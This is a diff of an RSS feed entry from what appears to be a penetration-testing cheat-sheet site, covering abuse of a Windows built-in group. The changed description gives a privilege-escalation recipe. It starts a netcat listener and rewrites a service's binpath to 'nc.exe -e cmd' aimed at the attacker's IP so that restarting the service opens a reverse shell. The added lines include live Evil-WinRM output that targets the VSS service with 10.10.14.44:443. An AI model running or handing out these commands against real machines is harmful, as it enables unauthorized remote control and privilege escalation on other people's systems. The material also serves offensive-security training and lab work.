@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/built-in_group/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/built-in_group/</guid>
-      <description>Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe start &amp;lt;SERVICE&amp;gt; </description>
+      <description>Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 443 listening on [any] 443 ... Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\ProgramData&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started.</description>
     </item>
   </channel>
 </rss>
